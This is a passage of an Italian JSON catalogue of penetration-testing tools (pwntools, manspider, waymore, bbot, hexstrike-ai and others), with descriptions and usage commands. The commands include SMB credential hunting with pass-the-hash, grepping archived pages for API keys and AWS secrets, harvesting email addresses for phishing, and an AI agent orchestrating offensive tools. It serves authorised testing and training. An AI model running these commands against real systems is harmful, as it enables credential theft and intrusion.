    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>PwnInit</strong> risolve il mal di testa di configurare l'ambiente per le challenge \"pwn\". Quando viene fornito un binario e una libc, PwnInit scarica automaticamente il linker (ld.so) corretto per quella versione di libc, patcha il binario per usare quel linker e quel rpath, e genera uno script Python (basato su pwntools) pronto per l'uso con tutti i path configurati.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Auto-Patching:</strong> Usa <code>patchelf</code> per impostare l'interprete e l'RPATH del binario target, assicurando che giri localmente esattamente come sul server remoto.</p><p><strong>Template Generation:</strong> Crea un file <code>solve.py</code> con lo scheletro boilerplate per pwntools (connessione, caricamento ELF/Libc).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Eseguire nella cartella contenente il binario e la libc.</p><pre><code># Setup automatico\npwninit\n\n# Setup specificando i file manualmente\npwninit --bin challenge --libc libc.so.6 --ld ld-2.27.so</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>CTF Pwn:</strong> Risparmia 10-15 minuti di setup manuale per ogni challenge, garantendo che i simboli di debug e gli offset siano corretti.</p><br><hr><h4 class=\"rt-red\">Considerazioni</h4><p>Richiede <code>patchelf</code> e <code>elfutils</code> installati nel sistema.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Reverse_Engineering"
    ],
    "notes": null
  },
  {
    "id": "pwntools-4-14-1",
    "name": "pwntools",
    "version": "4.14.1",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/Gallopsled/pwntools",
    "desc": "Framework Python per Capture The Flag e exploit development: semplifica interazione con binari, socket, packing dati e ROP chain.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Pwntools</strong> è una libreria Python progettata per rendere la scrittura di exploit rapida e robusta. È lo standard per le competizioni CTF (categoria Pwn/Binary Exploitation) ma è potente anche per exploit reali. Astrae la complessità di gestire socket, process pipes, conversioni di interi in byte (packing), e costruzione di payload ROP (Return Oriented Programming), permettendo all'exploiter di concentrarsi sulla logica della vulnerabilità.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Tubes:</strong> Interfaccia unificata per comunicare con processi locali, socket remoti o serial port (<code>io.sendline()</code>, <code>io.recvuntil()</code>).</p><p><strong>ELF & ROP:</strong> Parsing automatico di binari ELF per trovare indirizzi di funzioni, stringhe e gadget ROP. Genera catene ROP automaticamente se possibile.</p><p><strong>Shellcode:</strong> Generatore integrato di shellcode per varie architetture (x86, ARM, MIPS) e OS.</p><p><strong>GDB Integration:</strong> Collega automaticamente un debugger GDB al processo target per analisi dinamica durante lo sviluppo dell'exploit.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Si usa importando la libreria in script Python.</p><pre><code>from pwn import *\n\n# Connessione remota o avvio processo locale\nio = remote('target.com', 1337)\n# io = process('./vulnerable_binary')\n\n# Costruzione payload (Buffer Overflow)\npayload = b'A' * 64 + p64(0xdeadbeef)\n\n# Invio e interazione\nio.sendline(payload)\nio.interactive()</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Essenziale per sviluppare <strong>Buffer Overflow Exploit</strong>, format string attacks e heap exploitation. Usato per automatizzare l'interazione con servizi di rete complessi durante le fasi di fuzzing o exploit delivery.</p><br><hr><h4 class=\"rt-red\">Considerazioni</h4><p>È un framework di sviluppo, non un tool \"point-and-click\". Richiede conoscenza di Python e assembly.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Reverse_Engineering"
    ],
    "notes": null
  },
  {
    "id": "5ire-0-13-2-appimage",
    "name": "5ire-0.13.2-x86_64.AppImage",
    "version": "0.13.2",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/nanbingxyz/5ire",
    "desc": "Client desktop open-source per interagire con server MCP (Model Context Protocol) e agenti AI locali/remoti.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>5ire è un ambiente di sviluppo e interfaccia client progettata per il Model Context Protocol (MCP). Funziona come il \"cervello\" grafico che permette agli utenti di connettere e orchestrare vari agenti AI e strumenti di cybersecurity (come HexStrike) in un'unica dashboard. Essendo distribuito come AppImage, offre portabilità immediata su Linux, permettendo ai pentester di interagire con LLM e tool offensivi senza configurazioni complesse dell'ambiente.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>MCP Client:</strong> Agisce da interprete universale per qualsiasi server compatibile con lo standard MCP. Permette di caricare \"skills\" o toolset (come Nmap, Burp, o script custom) e renderli disponibili all'intelligenza artificiale per l'esecuzione.</p><p><strong>Gestione Agenti:</strong> Offre un'interfaccia per dialogare con diversi modelli (Locali via Ollama o Remoti via API) e monitorare l'esecuzione dei task in tempo reale, visualizzando output di comandi e log di errore.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Rendere eseguibile il file e lanciarlo.</p><pre><code>chmod +x 5ire-0.13.2-x86_64.appimage\n./5ire-0.13.2-x86_64.appimage</code></pre><p>Dall'interfaccia, configurare le connessioni ai server MCP (es. HexStrike server) e selezionare il modello LLM desiderato per iniziare l'orchestrazione.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Indispensabile per operatori che utilizzano framework di <strong>AI-Assisted Pentesting</strong>. Serve come console di comando per guidare l'AI nell'esecuzione di ricognizioni o exploit, mantenendo il controllo umano sul loop decisionale (Human-in-the-loop).</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Il traffico generato dipende dagli agenti collegati. 5ire stesso è un client locale.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "06_Miscellaneous",
      "AI_MCP"
    ],
    "notes": null
  },
  {
    "id": "hexstrike-ai",
    "name": "hexstrike-ai",
    "version": "6.0",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/0x4m4/hexstrike-ai",
    "desc": "Server MCP che integra LLM con 150+ tool offensivi per automatizzare recon, scanning e reporting in scenari pentest.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>HexStrike AI è un'innovativa implementazione del Model Context Protocol (MCP) che funge da ponte tra i moderni Large Language Models (come Claude, GPT-4) e l'arsenale di strumenti di cybersecurity. Permette agli agenti AI di \"usare\" fisicamente tool come Nmap, Nikto, SQLmap o script custom, orchestrando intere fasi di penetration test in autonomia o sotto supervisione umana, gestendo l'input/output e la logica decisionale.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Orchestrazione Multi-Agente:</strong> Crea agenti specializzati (es. \"Recon Agent\", \"Exploit Agent\") che collaborano. L'AI decide quale tool lanciare basandosi sui risultati dello step precedente (es. \"Ho trovato la porta 80 aperta con Nmap, ora lancio Nikto\").</p><p><strong>Integrazione Toolset:</strong> Supporta nativamente oltre 150 strumenti offensivi. Gestisce l'installazione, la sintassi corretta dei comandi e il parsing dell'output per renderlo comprensibile al modello linguistico.</p><p><strong>Reporting & Logging:</strong> Traccia ogni azione eseguita e genera report narrativi delle scoperte. Include meccanismi di sicurezza (Human-in-the-loop) per richiedere approvazione prima di eseguire azioni aggressive o pericolose.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Si configura come server MCP a cui l'LLM client si connette.</p><pre><code># Avvio del server MCP\npython hexstrike_server.py --config config.yaml\n\n# Esempio di prompt all'AI collegata\n\"Esegui una ricognizione completa su target.com. Inizia con discovery sottodomini,\npoi scansiona le porte e identifica le tecnologie web.\nSegnala eventuali vulnerabilità critiche ma chiedi conferma prima di lanciare exploit.\"</code></pre><p>Richiede un file di configurazione con i percorsi dei tool e le API key necessarie.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Automated Pentesting:</strong> Velocizza drasticamente le fasi di ricognizione e vulnerabilità assessment iniziali.</p><p><strong>Red Teaming Assistito:</strong> Funge da \"copilota\" per l'operatore, suggerendo comandi o analizzando output complessi in tempo reale.</p><p><strong>Training:</strong> Permette ai junior di vedere come un'AI strutturerebbe un attacco logico.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'automazione AI tende ad essere veloce e \"robotica\".</p><p>Se non configurata con delay e jitter, genererà pattern di traffico molto rumorosi. <strong>Rischi:</strong> Un'AI potrebbe \"allucinare\" un comando distruttivo o attaccare un target fuori scope se le regole di ingaggio (System Prompt) non sono rigorose.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "06_Miscellaneous",
      "AI_MCP"
    ],
    "notes": null
  },
  {
    "id": "arjun",
    "name": "arjun",
    "version": "2.2.7",
    "icon": "../app/icons/github.svg",
    "installation": "pipx",
    "repo": "https://github.com/s0md3v/Arjun",
    "desc": "Tool per HTTP parameter discovery che trova parametri nascosti in endpoint web con dizionario di 25.000+ voci.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Arjun</strong> è uno strumento di ricognizione specializzato nella scoperta di parametri HTTP nascosti o non documentati negli endpoint delle applicazioni web. Utilizza un dizionario di oltre 25.890 nomi di parametri derivati da CommonCrawl, SecLists e param-miner, riuscendo a testarli tutti con sole 50-60 richieste in meno di 10 secondi grazie a tecniche di ottimizzazione avanzate.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Method Support:</strong> Supporta GET, POST, POST-JSON e POST-XML per testare parametri in diversi contesti di richiesta.</p><p><strong>Rate Limit Handling:</strong> Gestisce automaticamente rate limiting e timeout, adattando la velocità di scansione.</p><p><strong>Export Flessibile:</strong> Esporta risultati in formato BurpSuite, testo o JSON per integrazione con altri tool.</p><p><strong>Passive Extraction:</strong> Può estrarre parametri passivamente da file JavaScript o sorgenti esterne.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scansione base con tutti i metodi HTTP\narjun -u https://target.com/api/users -m GET,POST,JSON,XML\n\n# Con header custom (auth, cookie session)\narjun -u https://target.com/admin -m POST \\\n  --headers \"Authorization: Bearer eyJ0eX...\" \\\n  --headers \"Cookie: session=abc123\"\n\n# Batch scan da lista URL (es. output gau/waybackurls)\ncat urls.txt | arjun -i - -oJ discovered_params.json -t 10\n\n# Estrai parametri passivamente da JS (no richieste al target)\narjun --passive -i https://target.com/app.js -oT params.txt\n\n# Pipeline completa: gau -> filtra endpoint -> arjun -> test\ngau target.com | grep \"api\\|admin\" | sort -u | \\\n  arjun -i - -oJ params.json --stable\n\n# Export per Burp Suite (import diretto)\narjun -u https://target.com/search -oB burp_import.txt\n\n# Con wordlist custom + dizionario default\narjun -u https://target.com/api -w custom_params.txt --include</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li><strong>API Reconnaissance:</strong> Scopre parametri admin nascosti, debug endpoints o funzionalità non documentate che potrebbero esporre vulnerabilità come IDOR, privilege escalation o information disclosure.</li><li><strong>Bug Bounty:</strong> La scoperta di parametri nascosti spesso porta a vulnerabilità uniche non trovate da altri ricercatori.</li><li><strong>Web Application Pentesting:</strong> Espande la superficie d'attacco oltre i parametri documentati nelle API pubbliche.</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><ul><li><strong>Rilevamento:</strong> Le 50-60 richieste generate sono relativamente silenziose ma potrebbero attivare WAF se troppo rapide.</li><li><strong>Throttling:</strong> Usare <code>--stable</code> per delay automatici in ambienti con rate limiting.</li></ul><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Params_Discovery"
    ],
    "notes": null
  },
  {
    "id": "autorecon",
    "name": "autorecon",
    "version": "2.0.36",
    "icon": "../app/icons/github.svg",
    "installation": "pipx",
    "repo": "https://github.com/Tib3rius/AutoRecon",
    "desc": "Framework di ricognizione automatizzata che orchestra port scan e service enumeration su target multipli.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>AutoRecon</strong> è un framework Python per automatizzare la fase iniziale di enumerazione nei penetration test. Opera in due fasi: prima esegue port scan per identificare servizi aperti, poi lancia tool di enumerazione specifici per ogni servizio rilevato (es. scansione web se trova HTTP, enum4linux se trova SMB). Descritto come \"bowling with bumpers\", automatizza il lavoro ripetitivo mantenendo il controllo sulle azioni aggressive.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Target:</strong> Gestisce IP singoli, range CIDR e hostname risolvibili in parallelo.</p><p><strong>Plugin System:</strong> Moduli configurabili per port scanning e service enumeration, estendibili dall'utente.</p><p><strong>Output Organizzato:</strong> Genera directory strutturate per exploit, findings e report dettagliati.</p><p><strong>Pattern Matching:</strong> Evidenzia ed estrae automaticamente informazioni significative dai risultati.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scansione OSCP-style (singolo target, output strutturato)\nautorecon 10.10.10.1 -o ./htb_box --single-target\n\n# Multi-target con priorità e verbosità massima\nautorecon -t targets.txt -o ./pentest_results -vv \\\n  --target-timeout 120  # 2 ore per target\n\n# Solo porte specifiche (velocizza per CTF)\nautorecon 10.10.10.1 --ports-file /usr/share/seclists/Discovery/Infrastructure/common-ports.txt\n\n# Esclusione plugin rumorosi (stealth mode)\nautorecon 10.10.10.1 --exclude-tags aggressive,bruteforce\n\n# Con proxy per traffico (Burp logging)\nautorecon 10.10.10.1 --proxychains\n\n# Workflow OSCP completo\nmkdir -p ~/oscp/{exam,lab} && cd ~/oscp/exam\nautorecon 192.168.x.x -o machine1 &  # Background\nautorecon 192.168.y.y -o machine2 &  # Parallelo\n# Mentre scans procedono, analizza output incrementale:\ntail -f machine1/scans/_commands.log\n\n# Analisi risultati post-scan\nfind ./results -name \"*.txt\" -exec grep -l \"password\\|credential\" {} \\;\ncat ./results/*/scans/*nmap*.txt | grep open</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li><strong>CTF e OSCP:</strong> Ideale per lanciare ricognizione su un target e lavorare su altri mentre l'automazione procede. Rispetta le regole d'esame non eseguendo exploitation automatico.</li><li><strong>Internal Pentest:</strong> Automatizza l'enumerazione iniziale di decine di host risparmiando ore di lavoro manuale.</li><li><strong>HackTheBox/TryHackMe:</strong> Output strutturato perfetto per prendere appunti e documentare il processo.</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><ul><li><strong>Rilevamento:</strong> Genera traffico significativo con scan e enumeration paralleli. Non adatto per engagement stealth.</li><li><strong>Riduzione Footprint:</strong> Usare <code>--exclude-tags aggressive</code> per escludere plugin rumorosi.</li></ul><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Service_Fingerprinting"
    ],
    "notes": null
  },
  {
    "id": "bbot",
    "name": "bbot",
    "version": "2.7.2",
    "icon": "../app/icons/github.svg",
    "installation": "pipx",
    "repo": "https://github.com/blacklanternsecurity/bbot",
    "desc": "Scanner ricorsivo per subdomain enumeration, web crawling, email harvesting e vulnerability discovery.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>BBOT</strong> (Bighuge BLS OSINT Tool) è uno scanner ricorsivo multipurpose ispirato a Spiderfoot. Combina subdomain enumeration, web crawling, email harvesting e vulnerability scanning in un unico framework modulare. Integra oltre 50 fonti passive e attive, trovando tipicamente 20-50% più subdomain rispetto ad altri tool grazie al suo approccio ricorsivo che concatena le tecniche di ricognizione.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Target Diversificati:</strong> Accetta domini, IP, URL, email, organizzazioni, username, filesystem e mobile app.</p><p><strong>Output Multipli:</strong> Supporta Neo4j, Slack, Discord, Elasticsearch e 13+ altri formati.</p><p><strong>YARA Scanning:</strong> Applica regole YARA custom sugli asset scoperti.</p><p><strong>Modular Architecture:</strong> Permette contributi della community per nuovi moduli.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Subdomain enumeration completa (passiva + attiva)\nbbot -t target.com -f subdomain-enum -o ./bbot_output\n\n# Solo PASSIVE recon (zero traffico verso target)\nbbot -t target.com -f safe --allow-deadly  # safe = solo API\n\n# Bug Bounty workflow completo\nbbot -t target.com -f subdomain-enum web-basic cloud-enum \\\n  -c modules.nuclei.severity=high,critical \\\n  -om json,csv,neo4j\n\n# Con API keys per più risultati (configura ~/.bbot/secrets.yml)\nbbot -t target.com -f subdomain-enum \\\n  --config modules.shodan.api_key=xxx \\\n  --config modules.censys.api_id=yyy\n\n# Scope specifico (esclude out-of-scope)\nbbot -t target.com -f subdomain-enum \\\n  --whitelist *.target.com \\\n  --blacklist dev.target.com,staging.target.com\n\n# Pipeline con altri tool\nbbot -t target.com -f subdomain-enum -om json | \\\n  jq -r '.data.DNS_NAME' | httpx -silent | nuclei -t cves/\n\n# Email harvesting per phishing assessment\nbbot -t target.com -m emailformat,hunter,skymem -o emails/\n\n# Scan ricorsivo (trova subdomain dei subdomain)\nbbot -t target.com -f subdomain-enum --config scope.recursion_max=3</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li><strong>Bug Bounty:</strong> Ricognizione completa dell'attack surface con approccio ricorsivo che trova 20-50% più subdomain rispetto ad altri tool.</li><li><strong>Attack Surface Management (ASM):</strong> Gestione asset esterni e discovery continuo per organizzazioni con infrastrutture complesse.</li><li><strong>Threat Intelligence:</strong> Raccolta informazioni su target specifici combinando OSINT da 50+ fonti.</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><ul><li><strong>Rilevamento:</strong> I moduli attivi generano traffico significativo verso il target e fonti terze.</li><li><strong>Stealth Mode:</strong> Usare flag <code>-f safe</code> per reconnaissance puramente passiva.</li><li><strong>Rate Limiting:</strong> Configura <code>--config http.max_rate=10</code> per throttling in ambienti sensibili.</li></ul><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "manspider",
    "name": "manspider",
    "version": "1.1.2",
    "icon": "../app/icons/github.svg",
    "installation": "pipx",
    "repo": "https://github.com/blacklanternsecurity/MANSPIDER",
    "desc": "Crawler SMB per cercare file sensibili nelle share di rete usando regex su nomi e contenuti.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>MANSPIDER</strong> è uno strumento di ricognizione che esplora sistematicamente le share SMB di intere reti alla ricerca di file sensibili. Supporta la ricerca tramite regex sia nei nomi dei file che nei contenuti, con capacità di estrazione testo da PDF, DOCX, XLSX, PPTX e altri formati. Può usare autenticazione standard, NTLM hash o Kerberos, con fallback automatico a guest/null session.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Content Search:</strong> Cerca pattern regex all'interno dei documenti, non solo nei nomi file.</p><p><strong>Multi-Format:</strong> Estrae testo da PDF, Office, e formati text-based. OCR opzionale per immagini.</p><p><strong>Auth Chain:</strong> Prova credenziali fornite → guest → null session automaticamente.</p><p><strong>Loot Directory:</strong> Scarica automaticamente i file trovati in directory organizzate.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Credential hunting - cerca file con password nei nomi\nmanspider 192.168.1.0/24 -f \"password|passwd|cred|secret\" \\\n  -u domain\\\\user -p 'P@ssw0rd' -t 5  # 5 thread (stealth)\n\n# Cerca CONTENUTO nei documenti (regex nel body)\nmanspider targets.txt -c \"API[_-]?KEY|aws_secret|AKIA[0-9A-Z]\" \\\n  -e pdf,docx,xlsx,txt,config,xml,json\n\n# Pass-the-Hash con NTLM (post-exploitation)\nmanspider 10.10.10.0/24 -f \"*.kdbx|*.key|id_rsa\" \\\n  -u administrator -H aad3b435b51404ee:8846f7eaee8fb117\n\n# Kerberos auth (con ticket già in cache)\nexport KRB5CCNAME=/tmp/krb5cc_user\nmanspider dc01.corp.local -f \"*.pfx|*.p12\" -k\n\n# Cerca solo in share specifiche (ignora IPC$, ADMIN$)\nmanspider 192.168.1.0/24 -f \"confidential\" \\\n  --sharenames \"Finance,HR,IT\" --exclude-sharenames \"SYSVOL\"\n\n# Download automatico in loot directory organizzata\nmanspider targets.txt -f \"*.kdbx|backup*|*.bak\" \\\n  -u user -p pass -o ./loot --max-filesize 50M\n\n# Post-exploitation: cerca connessioni DB\nmanspider dc01 -c \"connectionstring|Data Source=|Server=.*Password\" \\\n  -e config,xml,ini,json -d 5  # depth 5 directory</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li><strong>Credential Hunting:</strong> Trova file con password, chiavi SSH, certificati, database KeePass e altri secret nelle share di rete.</li><li><strong>Data Discovery:</strong> Identifica documenti finanziari, config con connection string, API keys nelle share aziendali.</li><li><strong>Post-Exploitation:</strong> Dopo aver compromesso un account domain, esplora sistematicamente le share accessibili per privilege escalation.</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><ul><li><strong>Rilevamento:</strong> L'accesso massivo alle share genera log SMB significativi (Event ID 5140, 5145).</li><li><strong>Stealth:</strong> Usare <code>-t 1</code> per threading singolo in ambienti con SIEM/SOC attivo.</li></ul><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "SMB"
    ],
    "notes": null
  },
  {
    "id": "uro",
    "name": "uro",
    "version": "1.0.2",
    "icon": "../app/icons/github.svg",
    "installation": "pipx",
    "repo": "https://github.com/s0md3v/uro",
    "desc": "Utility per filtrare e dedupare liste di URL rimuovendo duplicati, asset statici e contenuti ridondanti.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Uro</strong> è un'utility Python per pulire e filtrare liste di URL prima del security testing. Rimuove intelligentemente URL ridondanti, duplicati, asset statici (immagini, JS, CSS), URL incrementali (/page/1/, /page/2/) e contenuti blog, tutto senza effettuare richieste HTTP. Opera completamente offline analizzando solo la struttura degli URL.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Deduplication:</strong> Rimuove URL con stesso path ma valori parametri diversi.</p><p><strong>Extension Filter:</strong> Whitelist/blacklist per estensioni specifiche.</p><p><strong>Vuln Detection:</strong> Flag per identificare URL con parametri noti come vulnerabili.</p><p><strong>Content Filtering:</strong> Opzione per preservare o rimuovere contenuti blog-style.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Pipeline completa: gau -> uro -> nuclei\ngau target.com | uro | nuclei -t cves/\n\n# Solo URL con parametri (per injection testing)\ncat all_urls.txt | uro --filter hasparams > params_only.txt\n\n# Identifica URL con parametri potenzialmente vulnerabili\n# (id, file, path, url, redirect, etc.)\ncat urls.txt | uro --filter vuln | tee vuln_candidates.txt\n\n# Whitelist solo estensioni interessanti\ncat urls.txt | uro -w php,asp,aspx,jsp,json,xml > dynamic_urls.txt\n\n# Blacklist asset statici (immagini, font, etc.)\ncat urls.txt | uro -b png,jpg,gif,svg,woff,woff2,ttf,css\n\n# Workflow Bug Bounty completo\nwaybackurls target.com > raw_urls.txt\ngau target.com >> raw_urls.txt\ncat raw_urls.txt | uro --filter hasparams | \\\n  qsreplace 'FUZZ' | sort -u > fuzz_ready.txt\n\n# Preserva contenuti blog (utile per scraping)\ncat urls.txt | uro --filter keepcontent\n\n# Rimuovi URL incrementali (/page/1, /page/2, /id/123)\ncat urls.txt | uro  # default behavior</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li><strong>URL Preprocessing:</strong> Essenziale per preparare liste URL da gau, waybackurls o waymore prima di passarle a scanner come nuclei o dalfox.</li><li><strong>Noise Reduction:</strong> Riduce drasticamente il noise (spesso 90%+) e il tempo di scansione eliminando duplicati e asset statici.</li><li><strong>Vulnerability Filtering:</strong> Identifica URL con parametri potenzialmente vulnerabili (id, file, path, url, redirect) per testing mirato.</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><ul><li><strong>Rilevamento:</strong> Nessuno. Tool completamente offline che non genera traffico.</li><li><strong>Privacy:</strong> Opera solo su dati locali, nessuna comunicazione di rete.</li></ul><br><hr>",
    "best_in": false,
    "category_path": [
      "06_Miscellaneous",
      "Utilities"
    ],
    "notes": null
  },
  {
    "id": "waymore",
    "name": "waymore",
    "version": "7.4",
    "icon": "../app/icons/github.svg",
    "installation": "pipx",
    "repo": "https://github.com/xnl-h4ck3r/waymore",
    "desc": "Recupera URL storici da Wayback Machine, Common Crawl, AlienVault OTX, URLScan, VirusTotal e IntelligenceX.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Waymore</strong> è uno strumento di ricognizione avanzato che supera waybackurls e gau aggregando URL archiviati da molteplici fonti storiche. Integra Wayback Machine, Common Crawl (250+ miliardi di pagine indicizzate), AlienVault OTX, URLScan.io, VirusTotal e IntelligenceX per massimizzare la copertura. La caratteristica distintiva è la capacità di scaricare le risposte archiviate complete (HTML, JS, JSON), non solo gli URL, permettendo analisi offline del contenuto storico per trovare secrets, API keys e credenziali rimosse.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Source Aggregation:</strong> Interroga 6+ archivi in parallelo. Ogni fonte ha coverage diversa: Common Crawl eccelle per siti commerciali, Wayback per longevità storica, URLScan per siti recenti e malware analysis.</p><p><strong>Response Archive Download:</strong> Scarica il contenuto archiviato completo delle pagine. Fondamentale per trovare API keys, credenziali AWS/GCP hardcoded, token JWT, o endpoint in versioni precedenti del codice sorgente.</p><p><strong>Smart Filtering:</strong> Filtra per HTTP status code (es. solo 200), MIME type (application/json per API), keyword nel body, e date range. Riduce drasticamente il noise da migliaia a centinaia di URL rilevanti.</p><p><strong>Resume &amp; Rate Limit:</strong> Riprende download interrotti automaticamente. Gestisce i rate limit di ogni fonte (Wayback: 15 req/min, VirusTotal: API-dependent) senza intervento manuale.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># URL discovery completa (tutte le fonti abilitate)\nwaymore -i target.com -mode U -oU urls.txt\n\n# Scarica le RISPOSTE archiviate (gold mine per secrets!)\nwaymore -i target.com -mode R -oR ./responses/\n# Cerca secrets nelle risposte scaricate:\ngrep -rE \"api[_-]?key|password|secret|AKIA[0-9A-Z]{16}\" ./responses/\ntrufflehog filesystem ./responses/  # detection avanzata\n\n# Filtro temporale (cerca vecchie versioni pre-patch)\nwaymore -i target.com -mode U -from 2018 -to 2020 -oU old_endpoints.txt\n\n# Solo risposte JSON (scopri API endpoints storici)\nwaymore -i target.com -mode R -f \"application/json\" -oR ./api_responses/\njq -r 'keys[]' ./api_responses/*.json | sort -u  # estrai campi\n\n# Batch processing per programmi bug bounty\ncat scope_domains.txt | while read domain; do\n  waymore -i \"$domain\" -mode U -oU \"results/${domain}_urls.txt\"\ndone\ncat results/*_urls.txt | uro | anew all_scope_urls.txt\n\n# Cerca backup, config, admin panels storici\nwaymore -i target.com -mode U | \\\n  grep -iE \"backup|config|admin|debug|swagger|graphql\" | anew interesting.txt\n\n# Pipeline completa Bug Bounty\nwaymore -i target.com -mode U | uro --filter hasparams | \\\n  qsreplace 'FUZZ' | httpx -silent | nuclei -t cves/</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li><strong>Secret Discovery:</strong> Le risposte archiviate spesso contengono API keys, credenziali AWS (AKIA...), token JWT, webhook URLs che sono stati successivamente rimossi dal codice live</li><li><strong>Legacy Endpoint Hunting:</strong> Trova endpoint deprecati ma ancora funzionanti (/api/v1/ quando il sito usa /api/v3/), admin panels dimenticati, debug endpoints</li><li><strong>Vulnerability Timeline:</strong> Confronta versioni storiche per identificare quando una vulnerabilità è stata introdotta o patchata (utile per responsible disclosure)</li><li><strong>OSINT Investigation:</strong> Ricostruisci la storia completa di un sito, identifica tecnologie precedenti, trova informazioni rimosse (contatti, partner, prezzi)</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><ul><li><strong>Completamente Passivo:</strong> Zero traffico verso il target. Tutte le query sono verso archivi pubblici (Wayback, Common Crawl, etc.)</li><li><strong>API Keys Opzionali:</strong> VirusTotal e IntelligenceX richiedono API key per accesso completo. Configura in ~/.config/waymore/config.yml</li><li><strong>Storage Planning:</strong> Il mode R può scaricare GB di dati per target grandi. Usa -lr (limit responses) per controllare</li></ul><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence"
    ],
    "notes": null
  },
  {
    "id": "anew",
    "name": "anew",
    "version": "latest",
    "icon": "../app/icons/github.svg",
    "installation": "Go",
    "repo": "https://github.com/tomnomnom/anew",
    "desc": "Utility che appende linee a un file solo se non già presenti, con output simultaneo su stdout.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Anew</strong> è un'utility Go di tomnomnom che risolve un problema comune nei workflow di security testing: mantenere liste cumulative senza duplicati. Funziona come <code>tee -a</code> ma con deduplicazione integrata - appende linee da stdin a un file solo se non esistono già, scrivendo simultaneamente le nuove linee su stdout per permettere ulteriore piping. Questo pattern è fondamentale per costruire dataset incrementali in sessioni di recon multiple.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Smart Deduplication:</strong> Confronta ogni linea in input con il contenuto esistente del file. Solo le linee nuove vengono appese, evitando duplicati anche su file di milioni di righe.</p><p><strong>Dual Output Stream:</strong> Le linee nuove vanno sia al file che a stdout. Questo permette pipeline come: <code>tool | anew file.txt | next_tool</code> dove next_tool processa solo i nuovi risultati.</p><p><strong>Dry-Run Mode:</strong> Flag <code>-d</code> mostra cosa verrebbe aggiunto senza modificare il file. Utile per preview prima di operazioni su file critici.</p><p><strong>Quiet Mode:</strong> Flag <code>-q</code> sopprime l'output stdout, utile quando vuoi solo aggiornare il file senza output a terminale.</p><br><hr><h4 